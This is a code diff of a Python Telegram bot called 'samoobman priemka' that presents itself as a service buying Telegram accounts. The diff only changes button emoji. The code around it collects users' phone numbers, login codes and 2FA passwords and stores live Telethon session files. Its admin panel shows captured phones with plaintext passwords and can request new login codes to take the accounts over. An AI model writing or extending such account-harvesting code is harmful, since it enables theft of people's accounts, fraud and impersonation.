@@ -46,9 +46,6 @@ DB_PATH = "database.db"
 SESSIONS_DIR = "sessions_data"
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 
-# Глобальный ID премиум-эмодзи для всех кнопок
-DEFAULT_EMOJI_ID = "5368324170562092143"
-
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 router = Router()
@@ -239,22 +236,22 @@ async def edit_to_photo_or_text(message: Message, text: str, reply_markup, photo
 def get_main_keyboard(is_admin: bool = False):
     kb = [
         [
-            InlineKeyboardButton(text="Профиль", callback_data="menu_profile", icon_custom_emoji_id=DEFAULT_EMOJI_ID),
-            InlineKeyboardButton(text="Сдать ТГ аккаунт", callback_data="menu_submit_tg", icon_custom_emoji_id=DEFAULT_EMOJI_ID),
+            InlineKeyboardButton(text="👤 Профиль", callback_data="menu_profile"),
+            InlineKeyboardButton(text="📥 Сдать ТГ аккаунт", callback_data="menu_submit_tg"),
         ],
         [
-            InlineKeyboardButton(text="Вывод средств", callback_data="menu_withdraw", icon_custom_emoji_id=DEFAULT_EMOJI_ID),
-            InlineKeyboardButton(text="Поддержка", url="https://t.me/freakyfeelings", icon_custom_emoji_id=DEFAULT_EMOJI_ID)
+            InlineKeyboardButton(text="💰 Вывод средств", callback_data="menu_withdraw"),
+            InlineKeyboardButton(text="🆘 Поддержка", url="https://t.me/freakyfeelings")
         ],
     ]
     if is_admin:
-        kb.append([InlineKeyboardButton(text="Админ-панель", callback_data="admin_panel", icon_custom_emoji_id=DEFAULT_EMOJI_ID)])
+        kb.append([InlineKeyboardButton(text="👑 Админ-панель", callback_data="admin_panel")])
     return InlineKeyboardMarkup(inline_keyboard=kb)
 
 
 def get_back_keyboard():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Назад в меню", callback_data="back_main", icon_custom_emoji_id=DEFAULT_EMOJI_ID)]
+        [InlineKeyboardButton(text="⬅️ Назад в меню", callback_data="back_main")]
     ])
 
 
@@ -309,7 +306,7 @@ async def finalize_auth_and_success(client: TelegramClient, phone: str, session_
     )
 
     try:
-        success_text = "Ваш аккаунт успешно проверен и принят!\n💰 Вам автоматически начислен бонус **$1.00** на баланс."
+        success_text = "✅ Ваш аккаунт успешно проверен и принят!\n💰 Вам автоматически начислен бонус **$1.00** на баланс."
         await bot.send_message(chat_id=user_id, text=success_text, reply_markup=get_main_keyboard(user_id in ADMIN_IDS),
                                parse_mode="Markdown")
     except Exception:
@@ -326,19 +323,19 @@ async def cmd_start(message: Message):
 
     if not await check_sub(user.id):
         sub_kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Подписаться на канал",
-                                  url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-            [InlineKeyboardButton(text="Проверить подписку", callback_data="check_subscription", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
+            [InlineKeyboardButton(text="📢 Подписаться на канал",
+                                  url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")],
+            [InlineKeyboardButton(text="✅ Проверить подписку", callback_data="check_subscription")],
         ])
         await message.answer(
-            "Для использования бота **samoobman priemka** необходимо подписаться на наш Telegram канал!",
+            "⚠️ Для использования бота **samoobman priemka** необходимо подписаться на наш Telegram канал!",
             reply_markup=sub_kb, parse_mode="Markdown"
         )
         return
 
     is_admin = user.id in ADMIN_IDS
     text = (
-        "Добро пожаловать в официального бота автоскупки аккаунтов!\n\n"
+        "👋 Добро пожаловать в официального бота автоскупки аккаунтов!\n\n"
         "🔹 **samoobman priemka** — лучший сервис быстрой и безопасной скупки "
         "ваших Telegram аккаунтов по выгодным ценам.\n\n"
         "Выберите нужный раздел в меню ниже:"
@@ -350,17 +347,17 @@ async def cmd_start(message: Message):
 async def cb_check_sub(callback: CallbackQuery):
     if await check_sub(callback.from_user.id):
         is_admin = callback.from_user.id in ADMIN_IDS
-        text = "Подписка подтверждена! Добро пожаловать в **samoobman priemka**."
+        text = "✅ Подписка подтверждена! Добро пожаловать в **samoobman priemka**."
         await edit_to_photo_or_text(callback.message, text, get_main_keyboard(is_admin), "photo_menu")
     else:
-        await callback.answer("Вы не подписались на канал!", show_alert=True)
+        await callback.answer("❌ Вы не подписались на канал!", show_alert=True)
 
 
 @router.callback_query(F.data == "back_main")
 async def cb_back_main(callback: CallbackQuery, state: FSMContext):
     await state.clear()
     is_admin = callback.from_user.id in ADMIN_IDS
-    text = "Главное меню сервиса **samoobman priemka**.\n\nВыберите действие:"
+    text = "🏠 Главное меню сервиса **samoobman priemka**.\n\nВыберите действие:"
     await edit_to_photo_or_text(callback.message, text, get_main_keyboard(is_admin), "photo_menu")
 
 
@@ -373,7 +370,7 @@ async def cb_profile(callback: CallbackQuery):
 
     uid, username, full_name, balance, total_earned, reg_date = user_data
     text = (
-        f"**Ваш профиль в samoobman priemka**\n\n"
+        f"👤 **Ваш профиль в samoobman priemka**\n\n"
         f"• **Имя:** {full_name} (@{username})\n"
         f"• **ID:** `{uid}`\n"
         f"• **Дата регистрации:** {reg_date}\n"
@@ -387,7 +384,7 @@ async def cb_profile(callback: CallbackQuery):
 @router.callback_query(F.data == "menu_submit_tg")
 async def cb_submit_tg(callback: CallbackQuery, state: FSMContext):
     text = (
-        "**Сдача Telegram аккаунта** в **samoobman priemka**\n\n"
+        "📥 **Сдача Telegram аккаунта** в **samoobman priemka**\n\n"
         "Пожалуйста, введите номер телефона вашего аккаунта в международном "
         "формате (например, `+79991112233`):"
     )
@@ -404,11 +401,11 @@ async def process_phone(message: Message, state: FSMContext):
 
     phone = message.text.strip()
     if not phone.startswith("+"):
-        await message.answer("Неверный формат. Номер должен начинаться с плюса (+). Попробуйте снова:")
+        await message.answer("❌ Неверный формат. Номер должен начинаться с плюса (+). Попробуйте снова:")
         return
 
     uid = message.from_user.id
-    status_msg = await message.answer(f"Отправляю запрос кода на номер `{phone}`...", parse_mode="Markdown")
+    status_msg = await message.answer(f"⏳ Отправляю запрос кода на номер `{phone}`...", parse_mode="Markdown")
 
     session_name = os.path.join(SESSIONS_DIR, f"session_{uid}_{int(asyncio.get_event_loop().time())}")
     client = TelegramClient(session_name, int(API_ID), str(API_HASH))
@@ -427,7 +424,7 @@ async def process_phone(message: Message, state: FSMContext):
         )
 
         await status_msg.edit_text(
-            f"Код отправлен от Telegram на номер `{phone}`.\n\n"
+            f"📱 Код отправлен от Telegram на номер `{phone}`.\n\n"
             f"Пожалуйста, введите полученный 5-значный код в чат:",
             reply_markup=get_back_keyboard(),
             parse_mode="Markdown"
@@ -439,7 +436,7 @@ async def process_phone(message: Message, state: FSMContext):
             await client.disconnect()
         except Exception:
             pass
-        await status_msg.edit_text(f"Ошибка отправки кода: `{e}`", reply_markup=get_main_keyboard(uid in ADMIN_IDS),
+        await status_msg.edit_text(f"❌ Ошибка отправки кода: `{e}`", reply_markup=get_main_keyboard(uid in ADMIN_IDS),
                                    parse_mode="Markdown")
         await state.clear()
 
@@ -480,7 +477,7 @@ async def process_code(message: Message, state: FSMContext):
 
     except SessionPasswordNeededError:
         await state.update_data(status_msg_id=status_msg_id)
-        err_text = "На вашем аккаунте установлен облачный пароль (2FA).\nВведите ваш пароль в чат:"
+        err_text = "🔐 На вашем аккаунте установлен облачный пароль (2FA).\nВведите ваш пароль в чат:"
         if status_msg_id:
             try:
                 await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text,
@@ -495,7 +492,7 @@ async def process_code(message: Message, state: FSMContext):
             await client.disconnect()
         except Exception:
             pass
-        err_text = f"Неверный код или ошибка: `{e}`\nВведите код повторно:"
+        err_text = f"❌ Неверный код или ошибка: `{e}`\nВведите код повторно:"
         if status_msg_id:
             try:
                 await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text,
@@ -542,7 +539,7 @@ async def process_password(message: Message, state: FSMContext):
             await client.disconnect()
         except Exception:
             pass
-        err_text = f"Неверный пароль или ошибка: `{e}`\nВведите пароль снова:"
+        err_text = f"❌ Неверный пароль или ошибка: `{e}`\nВведите пароль снова:"
         if status_msg_id:
             try:
                 await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text,
@@ -558,10 +555,10 @@ async def cb_withdraw(callback: CallbackQuery, state: FSMContext):
     balance = user_data[3]
 
     if balance <= 0:
-        return await callback.answer("У вас недостаточно средств для вывода.", show_alert=True)
+        return await callback.answer("❌ У вас недостаточно средств для вывода.", show_alert=True)
 
     text = (
-        f"**Вывод средств в samoobman priemka**\n\n"
+        f"💰 **Вывод средств в samoobman priemka**\n\n"
         f"Ваш текущий баланс: **${balance:.2f}**\n"
         f"Введите сумму, которую хотите вывести:"
     )
@@ -583,7 +580,7 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
     try:
         amount = float(message.text.strip().replace(",", "."))
     except ValueError:
-        err_text = "Введите корректное число:"
+        err_text = "❌ Введите корректное число:"
         if prompt_msg_id:
             try:
                 await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
@@ -596,7 +593,7 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
     balance = user_data[3]
 
     if amount <= 0 or amount > balance:
-        err_text = f"Неверная сумма. Доступно для вывода: ${balance:.2f}. Введите снова:"
+        err_text = f"❌ Неверная сумма. Доступно для вывода: ${balance:.2f}. Введите снова:"
         if prompt_msg_id:
             try:
                 await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
@@ -613,8 +610,8 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
         await db.commit()
 
     withdraw_kb = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text=f"Выплачено (${amount})", callback_data=f"pay_success_{req_id}", icon_custom_emoji_id=DEFAULT_EMOJI_ID),
-        InlineKeyboardButton(text=f"Отклонить", callback_data=f"pay_cancel_{req_id}", icon_custom_emoji_id=DEFAULT_EMOJI_ID),
+        InlineKeyboardButton(text=f"✅ Выплачено (${amount})", callback_data=f"pay_success_{req_id}"),
+        InlineKeyboardButton(text=f"❌ Отклонить", callback_data=f"pay_cancel_{req_id}"),
     ]])
 
     for admin_id in ADMIN_IDS:
@@ -622,7 +619,7 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
             await bot.send_message(
                 chat_id=admin_id,
                 text=(
-                    f"**Новая заявка на вывод в samoobman priemka!**\n\n"
+                    f"🚨 **Новая заявка на вывод в samoobman priemka!**\n\n"
                     f"• От: {message.from_user.full_name} (`{message.from_user.id}`)\n"
                     f"• Сумма: **${amount:.2f}**"
                 ),
@@ -631,7 +628,7 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
         except Exception:
             pass
 
-    success_text = f"Заявка на вывод **${amount:.2f}** успешно создана и отправлена администратору."
+    success_text = f"✅ Заявка на вывод **${amount:.2f}** успешно создана и отправлена администратору."
     if prompt_msg_id:
         try:
             await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=success_text,
@@ -662,7 +659,7 @@ async def admin_pay_success(callback: CallbackQuery):
                 try:
                     await bot.send_message(
                         chat_id=uid,
-                        text=f"Ваша заявка на вывод **${amt:.2f}** в **samoobman priemka** успешно выплачена администратором!",
+                        text=f"✅ Ваша заявка на вывод **${amt:.2f}** в **samoobman priemka** успешно выплачена администратором!",
                         parse_mode="Markdown"
                     )
                 except Exception:
@@ -686,7 +683,7 @@ async def admin_pay_cancel(callback: CallbackQuery):
                 try:
                     await bot.send_message(
                         chat_id=uid,
-                        text=f"Ваша заявка на вывод **${amt:.2f}** была отменена администратором, средства возвращены на баланс.",
+                        text=f"❌ Ваша заявка на вывод **${amt:.2f}** была отменена администратором, средства возвращены на баланс.",
                         parse_mode="Markdown"
                     )
                 except Exception:
@@ -701,12 +698,12 @@ async def cb_admin_panel(callback: CallbackQuery):
         return await callback.answer("Доступ запрещен.", show_alert=True)
 
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Завершенные сделки (Аккаунты)", callback_data="admin_accounts_list", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-        [InlineKeyboardButton(text="Управление картинками", callback_data="admin_photos_menu", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-        [InlineKeyboardButton(text="Юзеры в TXT таблицу", callback_data="admin_export_txt", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-        [InlineKeyboardButton(text="Изменить баланс юзеру", callback_data="admin_change_balance", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-        [InlineKeyboardButton(text="Сделать рассылку", callback_data="admin_broadcast", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-        [InlineKeyboardButton(text="В главное меню", callback_data="back_main", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
+        [InlineKeyboardButton(text="📦 Завершенные сделки (Аккаунты)", callback_data="admin_accounts_list")],
+        [InlineKeyboardButton(text="🖼 Управление картинками", callback_data="admin_photos_menu")],
+        [InlineKeyboardButton(text="📊 Юзеры в TXT таблицу", callback_data="admin_export_txt")],
+        [InlineKeyboardButton(text="💵 Изменить баланс юзеру", callback_data="admin_change_balance")],
+        [InlineKeyboardButton(text="📢 Сделать рассылку", callback_data="admin_broadcast")],
+        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data="back_main")],
     ])
     await callback.message.edit_text(
         "👑 **Админ-панель samoobman priemka**\n\nВыберите нужную функцию:",
@@ -727,17 +724,17 @@ async def admin_accounts_list(callback: CallbackQuery):
 
     if not accounts:
         kb = InlineKeyboardMarkup(
-            inline_keyboard=[[InlineKeyboardButton(text="Назад в админ-панель", callback_data="admin_panel", icon_custom_emoji_id=DEFAULT_EMOJI_ID)]])
-        return await callback.message.edit_text("Завершенных сделок пока нет.", reply_markup=kb,
+            inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")]])
+        return await callback.message.edit_text("📭 Завершенных сделок пока нет.", reply_markup=kb,
                                                 parse_mode="Markdown")
 
     kb_buttons = []
     for acc in accounts:
         acc_id, uid, phone, pwd, date_str = acc
         pwd_text = f" | Пароль: {pwd}" if pwd else " | Без пароля"
-        kb_buttons.append([InlineKeyboardButton(text=f"{phone}{pwd_text}", callback_data=f"adm_acc_code_{acc_id}", icon_custom_emoji_id=DEFAULT_EMOJI_ID)])
+        kb_buttons.append([InlineKeyboardButton(text=f"📱 {phone}{pwd_text}", callback_data=f"adm_acc_code_{acc_id}")])
 
-    kb_buttons.append([InlineKeyboardButton(text="Назад в админ-панель", callback_data="admin_panel", icon_custom_emoji_id=DEFAULT_EMOJI_ID)])
+    kb_buttons.append([InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")])
 
     await callback.message.edit_text(
         "📦 **Завершенные сделки (Успешные аккаунты)**\n"
@@ -761,12 +758,12 @@ async def admin_auto_request_code(callback: CallbackQuery):
             row = await cursor.fetchone()
 
     if not row:
-        return await callback.answer("Аккаунт не найден в базе данных.", show_alert=True)
+        return await callback.answer("❌ Аккаунт не найден в базе данных.", show_alert=True)
 
     uid, phone, session_name, password = row
     session_file_path = f"{session_name}.session"
 
-    await callback.message.edit_text(f"Подключаюсь к аккаунте `{phone}` и запрашиваю код у Telegram...",
+    await callback.message.edit_text(f"⏳ Подключаюсь к аккаунте `{phone}` и запрашиваю код у Telegram...",
                                      parse_mode="Markdown")
 
     client = TelegramClient(session_file_path, int(API_ID), str(API_HASH))
@@ -778,14 +775,14 @@ async def admin_auto_request_code(callback: CallbackQuery):
         await client.disconnect()
 
         kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Запросить код повторно", callback_data=f"adm_acc_code_{acc_id}", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-            [InlineKeyboardButton(text="К списку сделок", callback_data="admin_accounts_list", icon_custom_emoji_id=DEFAULT_EMOJI_ID)]
+            [InlineKeyboardButton(text="🔄 Запросить код повторно", callback_data=f"adm_acc_code_{acc_id}")],
+            [InlineKeyboardButton(text="⬅️ К списку сделок", callback_data="admin_accounts_list")]
         ])
 
         pwd_display = f"\n• 🔑 Введенный пароль: `{password}`" if password else "\n• 🔑 Введенный пароль: Отсутствует"
 
         await callback.message.edit_text(
-            f"**Запрос кода для `{phone}` успешно отправлен в Telegram!**{pwd_display}\n\n"
+            f"✅ **Запрос кода для `{phone}` успешно отправлен в Telegram!**{pwd_display}\n\n"
             f"ℹ️ Код отправлен в официальное приложение Telegram на аккаунте. Проверьте его на устройстве.",
             reply_markup=kb,
             parse_mode="Markdown"
@@ -798,11 +795,11 @@ async def admin_auto_request_code(callback: CallbackQuery):
             pass
 
         kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Попробовать снова", callback_data=f"adm_acc_code_{acc_id}", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-            [InlineKeyboardButton(text="К списку сделок", callback_data="admin_accounts_list", icon_custom_emoji_id=DEFAULT_EMOJI_ID)]
+            [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data=f"adm_acc_code_{acc_id}")],
+            [InlineKeyboardButton(text="⬅️ К списку сделок", callback_data="admin_accounts_list")]
         ])
         await callback.message.edit_text(
-            f"**Ошибка при запросе кода для `{phone}`:**\n`{e}`",
+            f"❌ **Ошибка при запросе кода для `{phone}`:**\n`{e}`",
             reply_markup=kb,
             parse_mode="Markdown"
         )
@@ -814,11 +811,11 @@ async def admin_photos_menu(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS:
         return
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Главное меню (Фото)", callback_data="set_photo_menu", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-        [InlineKeyboardButton(text="Профиль (Фото)", callback_data="set_photo_profile", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-        [InlineKeyboardButton(text="Вывод средств (Фото)", callback_data="set_photo_withdraw", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-        [InlineKeyboardButton(text="Сдать ТГ аккаунт (Фото)", callback_data="set_photo_submit", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-        [InlineKeyboardButton(text="Назад в админ-панель", callback_data="admin_panel", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
+        [InlineKeyboardButton(text="🖼 Главное меню (Фото)", callback_data="set_photo_menu")],
+        [InlineKeyboardButton(text="🖼 Профиль (Фото)", callback_data="set_photo_profile")],
+        [InlineKeyboardButton(text="🖼 Вывод средств (Фото)", callback_data="set_photo_withdraw")],
+        [InlineKeyboardButton(text="🖼 Сдать ТГ аккаунт (Фото)", callback_data="set_photo_submit")],
+        [InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")],
     ])
     await callback.message.edit_text(
         "🖼 **Настройка картинок для разделов**\n\nВыберите раздел, для которого хотите установить или изменить фото:",
@@ -842,8 +839,8 @@ async def admin_set_photo_prompt(callback: CallbackQuery, state: FSMContext):
     await state.set_state(state_to_set)
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Удалить текущее фото", callback_data=f"del_{callback.data}", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-        [InlineKeyboardButton(text="Отмена", callback_data="admin_photos_menu", icon_custom_emoji_id=DEFAULT_EMOJI_ID)]
+        [InlineKeyboardButton(text="🗑 Удалить текущее фото", callback_data=f"del_{callback.data}")],
+        [InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_photos_menu")]
     ])
 
     await callback.message.edit_text(
@@ -867,7 +864,7 @@ async def admin_delete_photo(callback: CallbackQuery):
     setting_key = key_map.get(callback.data)
     if setting_key:
         await set_setting(setting_key, "")
-        await callback.answer("Картинка успешно удалена!", show_alert=True)
+        await callback.answer("✅ Картинка успешно удалена!", show_alert=True)
 
     await admin_photos_menu(callback)
 
@@ -893,16 +890,16 @@ async def admin_save_photo(message: Message, state: FSMContext):
 
     if setting_key:
         await set_setting(setting_key, photo_file_id)
-        await message.answer("Фотография для выбранного раздела успешно сохранена!")
+        await message.answer("✅ Фотография для выбранного раздела успешно сохранена!")
 
     await state.clear()
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Главное меню (Фото)", callback_data="set_photo_menu", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-        [InlineKeyboardButton(text="Профиль (Фото)", callback_data="set_photo_profile", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-        [InlineKeyboardButton(text="Вывод средств (Фото)", callback_data="set_photo_withdraw", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-        [InlineKeyboardButton(text="Сдать ТГ аккаунт (Фото)", callback_data="set_photo_submit", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
-        [InlineKeyboardButton(text="Назад в админ-панель", callback_data="admin_panel", icon_custom_emoji_id=DEFAULT_EMOJI_ID)],
+        [InlineKeyboardButton(text="🖼 Главное меню (Фото)", callback_data="set_photo_menu")],
+        [InlineKeyboardButton(text="🖼 Профиль (Фото)", callback_data="set_photo_profile")],
+        [InlineKeyboardButton(text="🖼 Вывод средств (Фото)", callback_data="set_photo_withdraw")],
+        [InlineKeyboardButton(text="🖼 Сдать ТГ аккаунт (Фото)", callback_data="set_photo_submit")],
+        [InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")],
     ])
     await message.answer(
         "👑 **Настройка картинок для разделов**\n\nВыберите раздел, для которого хотите установить или изменить фото:",
@@ -949,11 +946,11 @@ async def admin_get_uid(message: Message, state: FSMContext):
     try:
         uid = int(message.text.strip())
     except ValueError:
-        return await message.answer("Неверный ID. Введите числовой ID:")
+        return await message.answer("❌ Неверный ID. Введите числовой ID:")
 
     user = await get_user(uid)
     if not user:
-        await message.answer("Пользователь с таким ID не найден в базе.")
+        await message.answer("❌ Пользователь с таким ID не найден в базе.")
         return await state.clear()
 
     await state.update_data(target_uid=uid)
@@ -967,7 +964,7 @@ async def admin_set_balance(message: Message, state: FSMContext):
     try:
         new_bal = float(message.text.strip().replace(",", "."))
     except ValueError:
-        return await message.answer("Введите корректное число для баланса:")
+        return await message.answer("❌ Введите корректное число для баланса:")
 
     data = await state.get_data()
     uid = data["target_uid"]
@@ -976,7 +973,7 @@ async def admin_set_balance(message: Message, state: FSMContext):
         await db.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new_bal, uid))
         await db.commit()
 
-    await message.answer(f"Баланс пользователя `{uid}` успешно изменен на **${new_bal:.2f}**.", parse_mode="Markdown")
+    await message.answer(f"✅ Баланс пользователя `{uid}` успешно изменен на **${new_bal:.2f}**.", parse_mode="Markdown")
     await state.clear()
 
 
@@ -1009,7 +1006,7 @@ async def admin_send_broadcast(message: Message, state: FSMContext):
         except Exception:
             pass
 
-    await message.answer(f"Рассылка завершена. Успешно отправлено: `{count}` пользователям.", parse_mode="Markdown")
+    await message.answer(f"✅ Рассылка завершена. Успешно отправлено: `{count}` пользователям.", parse_mode="Markdown")
     await state.clear()
 
 
